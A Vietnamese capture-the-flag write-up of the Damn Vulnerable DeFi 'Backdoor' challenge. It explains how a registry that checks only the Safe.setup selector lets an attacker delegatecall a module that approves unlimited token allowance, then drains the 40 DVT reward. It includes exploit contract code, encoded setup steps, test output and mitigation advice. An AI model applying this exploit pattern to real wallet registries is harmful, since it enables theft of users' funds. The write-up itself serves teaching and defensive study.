---
title: "[DVD-12] Backdoor: nhét delegatecall độc hại vào Safe.setup() để rút DVT ngay khi registry trả thưởng"
description: "WalletRegistry thưởng 10 DVT cho mỗi Safe wallet hợp lệ của beneficiary, nhưng chỉ kiểm tra 4 byte đầu của initializer. Safe.setup() cho phép delegatecall tùy ý qua tham số to/data — attacker nhét code approve token vào đó, wallet vừa tạo vừa nhận thưởng đã lập tức trao quyền rút tiền cho attacker."
pubDate: 2026-08-28
tags: ["web3", "ctf", "smart-contract", "damn-vulnerable-defi", "wallet-proxy", "delegatecall"]
draft: true
challenge: "damn-vulnerable-defi"
difficulty: "medium"
series: "damn-vulnerable-defi"
---

## Tóm tắt

Backdoor khai thác cơ chế khởi tạo Safe multisig: `Safe.setup()` nhận hai tham số `to`/`data` và **delegatecall** chúng ngay trong quá trình khởi tạo proxy (dùng để cài module). WalletRegistry — contract trả thưởng 10 DVT cho mỗi Safe hợp lệ — chỉ kiểm tra 4 byte đầu của initializer có khớp `Safe.setup.selector` và vài điều kiện trạng thái cuối, nhưng không hề kiểm tra nội dung `to`/`data`. Attacker tạo 4 proxy Safe cho 4 beneficiary, mỗi proxy thực thi delegatecall tới một module nhỏ để approve token cho attacker ngay trong lúc setup; registry trả thưởng xong, attacker rút cả 40 DVT về recovery — tất cả trong một giao dịch.

## Bối cảnh & Mục tiêu

- **WalletRegistry** (`src/backdoor/WalletRegistry.sol`) — registry đăng ký Safe wallet cho các beneficiary; khi một proxy được tạo qua `SafeProxyFactory.createProxyWithCallback` với registry làm callback, nó kiểm tra tính hợp lệ rồi chuyển `PAYMENT_AMOUNT = 10e18` DVT tới wallet mới (dòng 20, 67–122).
- **Safe / SafeProxyFactory** (safe-smart-account) — thư viện ví đa chữ ký, proxy delegatecall vào singleton `Safe`.
- 4 beneficiary: alice, bob, charlie, david — mỗi người chỉ được nhận thưởng **một lần** (sau khi đăng ký, `beneficiaries[owner]` bị xóa).

Trạng thái ban đầu (`test/backdoor/Backdoor.t.sol`): registry giữ 40 DVT, 4 user là beneficiary hợp lệ. Điều kiện thắng (`_isSolved()`, dòng 129–145): player chỉ được thực hiện **đúng một giao dịch**, cả 4 user đều đã đăng ký wallet (không còn là beneficiary), và recovery nhận đủ 40 DVT.

## Phân tích lỗ hổng

Các kiểm tra của registry (`src/backdoor/WalletRegistry.sol:67-122`):

```solidity
function proxyCreated(SafeProxy proxy, address singleton, bytes calldata initializer, uint256) external override {
    if (token.balanceOf(address(this)) < PAYMENT_AMOUNT) revert NotEnoughFunds();
    if (msg.sender != walletFactory) revert CallerNotFactory();
    if (singleton != singletonCopy) revert FakeSingletonCopy();

    // Ensure initial calldata was a call to `Safe::setup`
    if (bytes4(initializer[:4]) != Safe.setup.selector) {
        revert InvalidInitialization();
    }

    // Ensure wallet initialization is the expected
    uint256 threshold = Safe(walletAddress).getThreshold();
    if (threshold != EXPECTED_THRESHOLD) revert InvalidThreshold(threshold);

    address[] memory owners = Safe(walletAddress).getOwners();
    if (owners.length != EXPECTED_OWNERS_COUNT) revert InvalidOwnersCount(owners.length);
    if (!beneficiaries[walletOwner]) revert OwnerIsNotABeneficiary();

    address fallbackManager = _getFallbackManager(walletAddress);
    if (fallbackManager != address(0)) revert InvalidFallbackManager(fallbackManager);

    beneficiaries[walletOwner] = false;
    wallets[walletOwner] = walletAddress;
    SafeTransferLib.safeTransfer(address(token), walletAddress, PAYMENT_AMOUNT);
}
```

Registry kiểm tra: factory đúng, singleton đúng, **4 byte đầu** của initializer là `Safe.setup`, threshold 1, đúng 1 owner, owner là beneficiary, và không có fallback handler. Tất cả đều là kiểm tra *sau khi* proxy đã chạy xong initializer — và initializer không bị hạn chế gì ngoài selector.

Mấu chốt nằm ở chữ ký của `Safe.setup` (safe-smart-account):

```solidity
function setup(
    address[] calldata _owners,
    uint256 _threshold,
    address to,          // delegatecall target — dùng để cài module
    bytes calldata data, // calldata của delegatecall
    address fallbackHandler,
    address paymentToken,
    uint256 payment,
    address payable paymentReceiver
) external
```

Khi `to != address(0)`, `setup` gọi `setupModules(to, data)` — thực hiện **delegatecall** `to` với `data` ngay trong context của proxy. Điều đó có nghĩa: bất kỳ code nào nằm trong `data` đều chạy với `address(this) == proxy`, với quyền ghi storage của proxy — trước khi registry kịp kiểm tra bất cứ điều gì. Registry chỉ chặn fallback handler (vì nó đọc slot `fallback_manager.handler.address`), nhưng delegatecall qua `to`/`data` không đụng tới slot đó.

Đây chính là lý do các kiểm tra "trạng thái cuối" của registry là vô nghĩa: kẻ tấn công không cần thay đổi gì các thuộc tính mà registry kiểm tra (owners, threshold, fallback handler), chỉ cần chạy thêm một hành động phụ — approve token — trong lúc setup.

## Khai thác

Hai contract hỗ trợ trong test (test/backdoor/Backdoor.t.sol:16-59):

```solidity
// Delegatecalled từ bên trong Safe.setup() (qua hook to/data) — chạy với
// address(this) == proxy mới, nên approve() được token coi là từ proxy.
contract BackdoorModule {
    function attack(address token, address approved) external {
        IERC20(token).approve(approved, type(uint256).max);
    }
}
```

`BackdoorExploit` làm toàn bộ trong constructor (một CREATE = một giao dịch):

1. Deploy `BackdoorModule`.
2. Với mỗi user, dựng `setupData = abi.encodeCall(Safe.setup, (owners=[user], 1, address(module), abi.encodeCall(BackdoorModule.attack, (token, address(this))), address(0), address(0), 0, payable(0)))` — chú ý `fallbackHandler = address(0)` để qua được kiểm tra `InvalidFallbackManager`.
3. Gọi `factory.createProxyWithCallback(singleton, setupData, i, registry)`. Trong lúc tạo: proxy chạy `setup` → delegatecall `BackdoorModule.attack` → proxy approve attacker với allowance vô hạn; sau đó factory gọi `proxyCreated` → mọi kiểm tra đều pass (owners/threshold chuẩn, không fallback manager) → registry chuyển 10 DVT vào proxy.
4. Sau vòng lặp, gọi `token.transferFrom(proxy[i], recovery, 10e18)` cho cả 4 proxy — allowance đã được cài sẵn từ bước 3.

Kết quả: 4 user vẫn "hợp lệ" theo mắt registry (wallet đăng ký đàng hoàng, beneficiary bị xóa đúng quy trình), nhưng toàn bộ 40 DVT tiền thưởng chảy thẳng về recovery.

## Kết quả

Chạy `forge test --match-path test/backdoor/Backdoor.t.sol`:

```
Ran 2 tests for test/backdoor/Backdoor.t.sol:BackdoorChallenge
[PASS] test_assertInitialState() (gas: 56040)
[PASS] test_backdoor() (gas: 1535045)
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

## Bài học & Cách phòng tránh

- **Không bao giờ tin initializer chỉ vì nó bắt đầu bằng selector đúng.** Khi một proxy cho phép thực thi code tùy ý trong lúc khởi tạo (delegatecall qua `to`/`data`), việc kiểm tra trạng thái sau khi khởi tạo là không đủ — code độc hại có thể chạy xong mà không để lại dấu vết nào trong các trường đang được kiểm tra. Registry phải kiểm tra **toàn bộ calldata** hoặc chỉ chấp nhận một encoding chuẩn, cấm `to`/`data` khác `address(0)`/rỗng.
- **Kiểm tra allowance/approval sau khi khởi tạo proxy:** nếu registry cấp token cho wallet, nó nên xác nhận wallet không approve ai ngoài các bên được phép (ví dụ: kiểm tra `token.allowance(wallet, anything) == 0`).
- **Nguyên tắc chung cho wallet-factory pattern:** bất kỳ contract nào "xác nhận tính hợp lệ của ví" trước khi rót tiền đều phải hiểu đầy đủ code khởi tạo mà ví có thể chạy — đặc biệt với các ví proxy delegatecall như Safe, nơi initializer là một kênh thực thi code tùy ý.

## Tham khảo

- Challenge: [Backdoor — Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/challenges/backdoor)
- Source: `src/backdoor/WalletRegistry.sol`, `test/backdoor/Backdoor.t.sol`
- Safe: [Safe.setup / setupModules](https://github.com/safe-global/safe-smart-account)
